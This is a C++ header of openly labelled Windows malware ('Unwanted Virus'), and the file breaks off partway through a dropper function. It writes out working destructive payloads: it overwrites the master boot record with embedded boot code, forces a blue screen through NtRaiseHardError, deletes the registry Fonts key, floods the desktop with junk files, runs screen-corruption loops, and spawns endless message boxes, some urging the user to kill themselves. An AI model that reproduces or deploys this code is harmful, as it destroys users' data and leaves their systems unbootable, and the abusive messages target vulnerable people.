#pragma once
/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|   payload data "payload.h"                 |
|                                            |
|   Copyright (c) 2021 BenjaminFretez        |
|                                            |
+--------------------------------------------*/


/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>
#include <shlwapi.h> // Required for check file existence
#include <cstdlib> // Required for no "ambiguous"
#include <stdlib.h> // Same
#include "data.h" // For Data

/*?*?*??*?*?*??*/
#include <Tlhelp32.h>
#include <Process.h>

#pragma warning (disable: 4244) // For fucking Argument Warning for an unusable payload
#pragma warning (disable: 4566) // For fucking Universal-Character-Name I know it cannot be represented in current code page.


/* required for downloading files */
#pragma comment (lib, "urlmon.lib")
#include <wininet.h>
#pragma comment(lib,"Wininet.lib")


using namespace std;

#include <shlobj.h>
#include <exdisp.h>
#include <shlwapi.h>
#include <atlbase.h>
#include <atlalloc.h>
#include <stdio.h>

class CCoInitialize {
public:
    CCoInitialize() : m_hr(CoInitialize(NULL)) { }
    ~CCoInitialize() { if (SUCCEEDED(m_hr)) CoUninitialize(); }
    operator HRESULT() const { return m_hr; }
    HRESULT m_hr;
};

void FindDesktopFolderView(REFIID riid, void** ppv)
{
    CComPtr<IShellWindows> spShellWindows;
    spShellWindows.CoCreateInstance(CLSID_ShellWindows);

    CComVariant vtLoc(CSIDL_DESKTOP);
    CComVariant vtEmpty;
    long lhwnd;
    CComPtr<IDispatch> spdisp;
    spShellWindows->FindWindowSW(
        &vtLoc, &vtEmpty,
        SWC_DESKTOP, &lhwnd, SWFO_NEEDDISPATCH, &spdisp);

    CComPtr<IShellBrowser> spBrowser;
    CComQIPtr<IServiceProvider>(spdisp)->
        QueryService(SID_STopLevelBrowser,
            IID_PPV_ARGS(&spBrowser));

    CComPtr<IShellView> spView;
    spBrowser->QueryActiveShellView(&spView);

    spView->QueryInterface(riid, ppv);
}

int genrand(int a, int b)
{
    srand(time(NULL));

    int r = rand() % 2;

    if (r == 0)
        return a;
    else
        return b;
}

void MoveDesktopIcons() {
    // The Main Function
    CCoInitialize init;
    CComPtr<IFolderView> spView;
    FindDesktopFolderView(IID_PPV_ARGS(&spView));

    CComPtr<IEnumIDList> spEnum;
    spView->Items(SVGIO_ALLVIEW, IID_PPV_ARGS(&spEnum));
    for (CComHeapPtr<ITEMID_CHILD> spidl;
        spEnum->Next(1, &spidl, nullptr) == S_OK;
        spidl.Free()) {
        POINT pt;
        spView->GetItemPosition(spidl, &pt);
        if (genrand(0, 1) == 1) {
            pt.x += (rand() % 10) + 5;
            pt.y += (rand() % 10) + 5;
        }
        if (genrand(0, 1) == 0) {
            pt.x -= (rand() % 10) + 5;
            pt.y -= (rand() % 10) + 5;
        }

        PCITEMID_CHILD apidl[1] = { spidl };
        spView->SelectAndPositionItems(
            1, apidl, &pt, SVSI_POSITIONITEM);
    }
}


/* for message boxes on random position */
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {

    scrw = GetSystemMetrics(SM_CXSCREEN);
    scrh = GetSystemMetrics(SM_CYSCREEN);
    if (nCode == HCBT_CREATEWND) {
        CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

        if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
            HWND hwnd = (HWND)wParam;

            int x = random() % (scrw - pcs->cx);
            int y = random() % (scrh - pcs->cy);

            pcs->x = x;
            pcs->y = y;
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

/* overwrite mbr content */
const unsigned char mbrContent[] = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E, 0xC0, 0xB4, 0x04, 0xA3,
0x90, 0xFC, 0x31, 0xC0, 0xB9, 0x48, 0x7E, 0x31, 0xFF, 0xF3, 0xAB, 0x8B, 0x05, 0x40, 0x40, 0xAB,
0x88, 0xC4, 0x92, 0xB8, 0x00, 0x1C, 0xAB, 0xB8, 0x98, 0xE6, 0xAB, 0xB8, 0x28, 0x14, 0xBB, 0x10,
0x25, 0xB1, 0x0B, 0xAB, 0x83, 0xC0, 0x16, 0x93, 0xAB, 0xFE, 0xC4, 0x93, 0xE2, 0xF5, 0x05, 0x8E,
0x15, 0x80, 0xFF, 0x5C, 0x75, 0xEB, 0xBF, 0xA0, 0xD4, 0xB1, 0x05, 0xB8, 0x04, 0x0B, 0xE8, 0x85,
0x01, 0x83, 0xC7, 0x3C, 0xE2, 0xF5, 0xBE, 0x96, 0xFC, 0x80, 0x7C, 0x02, 0x20, 0x72, 0x2D, 0xFE,
0xC5, 0x80, 0xFD, 0x37, 0x74, 0xAC, 0xAD, 0x97, 0xAD, 0x3C, 0x28, 0x74, 0x0B, 0x3C, 0x20, 0x75,
0x04, 0xC6, 0x44, 0xFE, 0x28, 0xE8, 0x5E, 0x01, 0x81, 0xFE, 0x72, 0xFD, 0x75, 0xDB, 0x88, 0xF0,
0x2C, 0x02, 0x72, 0xD2, 0x34, 0x01, 0x88, 0xC2, 0x88, 0xC6, 0xEB, 0xCA, 0x80, 0x74, 0x02, 0x08,
0x45, 0x83, 0xE5, 0x07, 0x52, 0x56, 0x55, 0x75, 0x0E, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x16, 0x8C,
0xFC, 0x74, 0xF6, 0x89, 0x16, 0x8C, 0xFC, 0xBE, 0x80, 0xFC, 0xB9, 0x04, 0x00, 0xAD, 0x3D, 0x40,
0x01, 0x97, 0x72, 0x43, 0xE8, 0x17, 0x01, 0x81, 0xEF, 0x42, 0x01, 0x8A, 0x05, 0x2C, 0x20, 0x72,
0x29, 0x56, 0x57, 0xB4, 0x04, 0xF6, 0xE4, 0x01, 0xC6, 0xAD, 0x97, 0xC6, 0x04, 0x20, 0xB8, 0x08,
0x0E, 0xE8, 0x02, 0x01, 0x5F, 0x5E, 0xEB, 0x1F, 0xAD, 0x09, 0xC0, 0x74, 0x2D, 0x3D, 0x00, 0xF0,
0x97, 0x73, 0x14, 0xE8, 0xE8, 0x00, 0x81, 0xC7, 0x3E, 0x01, 0xB8, 0x0C, 0x0C, 0x89, 0x7C, 0xFE,
0x80, 0xBD, 0x40, 0x01, 0x0B, 0x75, 0x05, 0x31, 0xC0, 0x89, 0x44, 0xFE, 0x80, 0x3D, 0x1C, 0x75,
0x06, 0xC7, 0x06, 0x92, 0xFC, 0x38, 0x0A, 0xE8, 0xC6, 0x00, 0xE2, 0xCC, 0xBE, 0x92, 0xFC, 0xAD,
0x08, 0xC0, 0x74, 0x0C, 0x04, 0x08, 0x75, 0x08, 0xB4, 0x1C, 0xFE, 0x0E, 0x91, 0xFC, 0x78, 0x4A,
0x89, 0x44, 0xFE, 0x8B, 0x3C, 0xE8, 0xAE, 0x00, 0x75, 0x2E, 0xB4, 0x02, 0xCD, 0x16, 0xA8, 0x04,
0x74, 0x02, 0x4F, 0x4F, 0xA8, 0x08, 0x74, 0x02, 0x47, 0x47, 0xA8, 0x03, 0x74, 0x0D, 0x83, 0x3E,
0x80, 0xFC, 0x00, 0x75, 0x06, 0x8D, 0x45, 0x08, 0xA3, 0x80, 0xFC, 0x97, 0x3D, 0xFE, 0xE5, 0x74,
0x07, 0x3D, 0x32, 0xE7, 0x74, 0x02, 0x89, 0x04, 0x5D, 0x5E, 0x5A, 0x8B, 0x04, 0x80, 0xFA, 0x01,
0x76, 0x0A, 0x05, 0x80, 0x02, 0x3D, 0x80, 0xD4, 0x72, 0x1B, 0xCD, 0x20, 0x48, 0x48, 0x72, 0x03,
0x83, 0xC0, 0x04, 0x50, 0xD1, 0xE8, 0xB1, 0xA0, 0xF6, 0xF1, 0xFE, 0xCC, 0x80, 0xFC, 0x94, 0x58,
0x72, 0x03, 0x80, 0xCE, 0x16, 0x89, 0x04, 0x05, 0x06, 0x0F, 0x93, 0xB9, 0x03, 0x00, 0xE4, 0x40,
0x3C, 0xFC, 0x72, 0x0D, 0xBF, 0x82, 0xFC, 0x83, 0x3D, 0x00, 0x74, 0x03, 0xAF, 0xE2, 0xF8, 0x89,
0x1D, 0xE9, 0xC2, 0xFE, 0x18, 0x18, 0x3C, 0x24, 0x3C, 0x7E, 0xFF, 0x24, 0x00, 0x80, 0x42, 0x18,
0x10, 0x48, 0x82, 0x01, 0x00, 0xBD, 0xDB, 0x7E, 0x24, 0x3C, 0x66, 0xC3, 0x00, 0x3C, 0x5A, 0xFF,
0xA5, 0x3C, 0x66, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x02, 0x31, 0xC0,
0x89, 0x85, 0x40, 0x01, 0xAB, 0xC3, 0x51, 0x57, 0x9C, 0x50, 0xBB, 0xA4, 0x7D, 0x2E, 0xD7, 0x93,
0xB9, 0x0A, 0x00, 0xF8, 0x88, 0xF8, 0x88, 0xFC, 0xE8, 0xE1, 0xFF, 0xD0, 0xE3, 0xE2, 0xF5, 0x81,
0xC7, 0x6C, 0x02, 0x58, 0x40, 0xA8, 0x07, 0x75, 0xE0, 0x9D, 0x5F, 0x59, 0xC3, 0x4F, 0x55, 0xAA
};

/* payload thread */
DWORD WINAPI payloadThread(LPVOID parameter) {
    int delay = 0;
    int times = 0;
    int runtime = 0;

    int(*function)(int, int) = (int(*)(int, int))parameter;

    for (;;) {
        if (delay-- == 0) {
            delay = (*function)(times++, runtime);
        }

        runtime++;
        Sleep(10);
    }
}


/* kill Windows instant */
void killWindowsInstant() {

    // Try to force BSOD first
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc000029A, 0, 0, 0, 6, &tmp2);
    }

    // If the computer is still running, do it the normal way
    HANDLE token;
    TOKEN_PRIVILEGES privileges;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

/* reverse text payload */
void strReverseW(LPWSTR str);

void enumerateChildren(HWND hwnd) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * rand());

    SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
    strReverseW(str);
    SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

    GlobalFree(str);

    HWND child = GetWindow(hwnd, GW_CHILD);

    while (child) {
        enumerateChildren(child);
        child = GetWindow(child, GW_HWNDNEXT);
    }
}

BOOL CALLBACK EnumWindowProc(HWND hwnd, LPARAM lParam) {
    enumerateChildren(hwnd);

    return TRUE;
}


void strReverseW(LPWSTR str) {
    int len = lstrlenW(str);

    WCHAR c;
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i];
        str[i] = str[j];
        str[j] = c;
    }

    // Fix Newlines
    for (i = 0; i < len - 1; i++) {
        if (str[i] == L'\n' && str[i + 1] == L'\r') {
            str[i] = L'\r';
            str[i + 1] = L'\n';
        }
    }
}

int payloadReverseText(int times, int runtime) {
    EnumWindows(&EnumWindowProc, NULL);

    return 50;
}

/* reverse change payload */
void strchangeW(LPWSTR str);

void enumerateChildren2(HWND hwnd) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * rand());

    SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
    strchangeW(str);
    SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

    GlobalFree(str);

    HWND child = GetWindow(hwnd, GW_CHILD);

    while (child) {
        enumerateChildren(child);
        child = GetWindow(child, GW_HWNDNEXT);
    }
}

void strchangeW(LPWSTR str) {
    int len = lstrlenW(str);

    WCHAR c;
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i] - rand() % 10;
        str[i] = str[j] + rand() % 10;
        str[j] = c + rand() % 10;
    }

    // Fix Newlines
    for (i = 0; i < len - 1; i++) {
        if (str[i] == L'\n' && str[i + 1] == L'\r') {
            str[i] = L'\r';
            str[i + 1] = L'\n';
        }
    }
}

BOOL CALLBACK EnumWindowProc2(HWND hwnd, LPARAM lParam) {
    enumerateChildren2(hwnd);

    return TRUE;
}

int payloadChangeText(int times, int runtime) {
    EnumWindows(&EnumWindowProc2, NULL);
    return 50;
}



/* create desktop files */
void CreateDesktopFiles() {
    TCHAR szPath[MAX_PATH];

    if (SUCCEEDED(SHGetFolderPath(NULL,
        CSIDL_DESKTOP | CSIDL_FLAG_CREATE,
        NULL,
        0,
        szPath)))
    {
        for (int i = 0; i < 300; ++i) {
            SHGetFolderPath(NULL, CSIDL_DESKTOP | CSIDL_FLAG_CREATE, NULL, 0, szPath);
            PathAppend(szPath, L"a" + rand() % 3000);
            CreateFileW(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        }
    }
}

void CreateDesktopFiles_() {
    for (int i = 0; i < 150; ++i) {
        CreateFileA("C:\\Users\\Public\\Desktop\\4t34jgj3t348g34g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\sALDpsdiePOSWDjwd" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\E3T34IT4FEIEWJj" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\mi49dkemdefff4g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\wefh4¤þ³€€³434g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\weffgergerg34g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\wefwejfwiegjg34g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\wedberjbierberg34g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\we2®³²®¤fwfwf4g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\wefh4gewr924tusmqg3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    }
}

/* destroy MBR by overwrite it */
void DestroyMBR() {

    DWORD dwBytesWritten;

    HANDLE MasterBootRecord = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

    WriteFile(MasterBootRecord, mbrContent, 512, &dwBytesWritten, NULL);

    CloseHandle(MasterBootRecord);

    cout << "\nMBR Has been destroyed\n";
}

/* first message box thread */
DWORD WINAPI messageBoxThread(LPVOID parameter) {
    while (1) {        
        MessageBoxW(NULL, L"AHHHHHHHHH WTF IS HAPPENING???", L"HELPPPPPP!!!!", MB_OK | MB_ICONWARNING);
        Sleep(3000);
        MessageBoxW(NULL, L"ur crazy, u ran unwanted virus", L"kill urself", MB_OK | MB_ICONWARNING);
        Sleep(3000);
        if (genrand(0, 1) == 1) {
            MessageBoxW(NULL, L"run away", L"run away", MB_OK | MB_ICONINFORMATION);
            Sleep(1500);
        }
        else {
            MessageBoxW(NULL, L"u need to die", L"ahahahahaah", MB_OK | MB_ICONQUESTION);
            Sleep(1500);
        }        
        MessageBoxW(NULL, L"An error has ocurred but the error message cannot be settleved due to another error", L"Microsoft Windows", MB_OK | MB_ICONERROR);
        MessageBoxW(NULL, L"run away", L"run away", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"Something Happened", L"Microsoft Windows", MB_OK | MB_ICONERROR);
        Sleep(2000);
        MessageBoxW(NULL, L"Interactive sign-in process initialization has failed.\n\nPlease check the event log for details.", L"Sign-in process initialization failure", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"Что-то произошло", L"Майкрософт Виндоус", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"don't press ok", L"ur crazy!!!!", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"What the hell I have done?", L"WAAAAAAAAAAAAAH", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"The installation only supports Windows 98\r\nSetup will now exit", L"Setup®", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"You do not have permission to view or edit the current permission settings for Documents, but you can take ownership or change auditing settings.", L"Security", MB_OK | MB_ICONWARNING);
        Sleep(1500);
    }
    return 0;
}

/* 2nd message box thread */
DWORD WINAPI messageBox1Thread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        if (genrand(0, 2) == 2) {
            MessageBoxW(NULL, L".>██Ø██ê", L"ÿ", MB_OK | MB_ICONHAND);
            Sleep(1500);
        }
        else if (genrand(0, 2) == 1) {
            MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_OK | MB_ICONWARNING);
            Sleep(1500);
        }
        else if (genrand(0, 2) == 0) {
            MessageBoxW(NULL, L"Unexpected error: 21.", L"Cannot run program", MB_OK | MB_ICONWARNING);
            Sleep(1500);
        }
        else {
            MessageBoxW(NULL, L"The installation only supports Windows 98\r\nSetup will now exit", L"Setup®", MB_OK | MB_ICONWARNING);
            Sleep(1500);
        }
        MessageBoxW(NULL, L"", L"Мой Компьютер", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"Stop clicking Ok", L"The Narrator", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"uR crazy bro u cannot run the unwanted virus", L"0_o", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"The system is not fully installed. Please run setup again", L"Windows Message", MB_OK | MB_ICONERROR);
        Sleep(1500);        
        MessageBoxW(NULL, L"The application was unable to start correctly (0xc000029A) Click OK to close the application", L"unwanted.exe - Application Error", MB_OK | MB_ICONERROR);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"An error has ocurred but the error message cannot be settleved due to another error", L"Microsoft Windows", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"Unexpected error: 21.", L"Cannot run program", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
    }
}

/* 3rd message box thread */
DWORD WINAPI messageBox2Thread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        if (genrand(0, 3) == 3) {
            MessageBoxW(NULL, L"Error reading drive AB:", L"Error", MB_DEFBUTTON2 | MB_ABORTRETRYIGNORE | MB_ICONHAND);
            Sleep(1500);
        }
        else if (genrand(0, 3) == 2) {
            MessageBoxW(NULL, L"Your password must be at least 18770 characters and cannot repeat any of your previous 30689 passwords. Please type a different password. Type a password that meets these requirements in both text boxes", L"Change Password", MB_OK | MB_ICONWARNING);
            Sleep(3000);
        }
        else if (genrand(0, 3) == 1) {
            MessageBoxW(NULL, L"Insert AtR█¶█¼ disk in drive A:", L"Change Disk", MB_OK | MB_ICONHAND);
            Sleep(1500);
        }
        else if (genrand(0, 3) == 0) {
            MessageBoxW(NULL, L"Access Denied", L"Access Denied", MB_OK | MB_ICONHAND);
            Sleep(1500);
        }
        else {
            MessageBoxW(NULL, L"Idiot who press ok", L"lol", MB_OK | MB_ICONHAND);
            Sleep(1500);
        }
        MessageBoxW(NULL, L"Error writing to Log\r\nSee log for more Information: µ:\\log.txt", L"Debug error", MB_OK | MB_ICONERROR);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        Sleep(1500);
        MessageBoxW(NULL, L"Windows Firewall can't change some of your settings.\r\nError code: 0x80070424", L"Windows Firewall", MB_OK | MB_ICONERROR);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"Device driver software was not installed.", L"Microsoft Windows", MB_OK | MB_ICONERROR);
        Sleep(2000);
        MessageBoxW(NULL, L"The sign-in process couldn't display security and sign-in\noptions when Ctrl+Alt+Delete was pressed. If Windows\ndoesn't respond, press Esc, or use the power switch to\nrestart.", L"Failure to display security and shut down options", MB_OK | MB_ICONERROR);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"Something happened.", L"Microsoft Windows", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
    }
    return 0;
}

/* 4rd message box thread */
DWORD WINAPI urnidiotmsgbx(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L"You are an idiot!", L"You are an idiot!", MB_OK | MB_ICONWARNING);
        CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"The application falied to initialize properly (0xc00000005). Click OK to terminate the application", L"dwwin.exe - Application Error", MB_OK | MB_ICONERROR);
        Sleep(1500); 
        MessageBoxW(NULL, L"The system is not fully installed. Please run setup again", L"Windows Message", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"The file or directory C:\\$Secure is corrupt and unreadable. Please run chkdsk utility.", L"Winlogon generic control dialog: winlogon.exe - Corrupt File", MB_OK | MB_ICONERROR);
        Sleep(1500);
        CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
    }
    return 0;
}


/* message box payload */
int payloadMessageBox(int times, int runtime) {
    CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
    Sleep(5000);
    CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
    Sleep(5000);
    CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
    Sleep(9000);
    CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
    Sleep(10000);
    return 0;
}

void Fonts() {
    RegDeleteKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Fonts"));
}

/* message boxes when windows die */
DWORD WINAPI ripmessages(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    MessageBoxW(NULL, L"Now I will terminate your system", L"AAAAAAAA", MB_OK | MB_ICONWARNING);
    MessageBoxW(NULL, L"Stop Pressing OK!", L"AAAAAAAA", MB_OK | MB_ICONWARNING);
    return 1;
}

DWORD WINAPI STARTripmessages(LPVOID parameter) {
    while (1) {
        CreateThread(NULL, 4096, &ripmessages, NULL, NULL, NULL);
        Sleep(250);
    }
}


int DestroyURScreen() {


    while (TRUE)
    {
        int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY); // Mini effect blur to left bbbbbb
        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCAND); // Mini effect blur to left bbbbbb
        PatBlt(hdc, -1, y, sw, h, PATINVERT);
        Sleep(rand() % 10);
        BitBlt(hdc, rand() % (sw - rand() % 10), rand() % (sh - rand() % 10), rand() % (sw - rand() % 10), rand() % (sh - rand() % 10), hdc, rand() % (sw - rand() % 10), rand() % (sh - rand() % 10), SRCAND); // Pick random parts of screen and Invert it
        BitBlt(hdc, rand() % (sw + rand() % 10), rand() % (sh + rand() % 10), rand() % (sw + rand() % 10), rand() % (sh + rand() % 10), hdc, rand() % (sw + rand() % 10), rand() % (sh + rand() % 10), SRCAND); // Pick random parts of screen and Invert it
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCAND); // Pick random parts of screen and copy it
        hwnd = GetForegroundWindow();
        hW = GetWindowDC(hwnd);
        hdc = GetDC(0);
        GetWindowRect(hwnd, &rekt);
        w = GetSystemMetrics(SM_CXSCREEN);
        h = GetSystemMetrics(SM_CYSCREEN); 
        Pt[0].x = rekt.left + (rand() % 3);
        Pt[0].y = rekt.top + (rand() % 3);
        Pt[1].x = rekt.right + (rand() % 3);
        Pt[1].y = rekt.top + (rand() % 3);
        Pt[2].x = rekt.left + (rand() % 3);
        Pt[2].y = rekt.bottom + (rand() % 3);
        PlgBlt(hdc, Pt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0); // The falling window effect


    }
}

void RegCreateSet(HKEY hKey, LPCTSTR KeyLocation, LPCTSTR keyname, int Type, LPCTSTR Data, int size)
{
    HKEY key;
    RegCreateKeyEx(hKey, KeyLocation, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &key, NULL);

    if (RegOpenKeyEx(hKey, KeyLocation, 0, KEY_SET_VALUE | KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
    {
        RegSetValueEx(key, keyname, 0, Type, (LPBYTE)Data, size);
    }
    else {
        MessageBox(
            NULL,
            (LPCWSTR)L"ERROR ACCESSING REGISTRY", // Warning message box
            (LPCWSTR)L"LOL",
            MB_ICONERROR | MB_OK
        );
    }

    RegCloseKey(key);
}

void RegSetVal(HKEY hKey, LPCTSTR KeyLocation, LPCTSTR keyname, LPCTSTR Data, int size)
{
    HKEY key;

    if (RegOpenKeyEx(hKey, KeyLocation, 0, KEY_SET_VALUE | KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
    {
        RegSetValueEx(key, keyname, 0, REG_SZ, (LPBYTE)Data, size);

    }
    else {
        MessageBox(
            NULL,
            (LPCWSTR)L"ERROR ACCESSING REGISTRY 2", // Warning message box
            (LPCWSTR)L"LOL",
            MB_ICONERROR | MB_OK
        );
    }

    RegCloseKey(key);
}



void CreateTimeDate() {

    /* Create TimeDate Payload */
    HANDLE kwi = CreateFileA("C:\\Program Files\\Common Files\\MIW.EXE", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    WriteFile(kwi, tdp, tdp_len, &wb, NULL);

    CloseHandle(kwi);

    /* Attribute it System and hide */
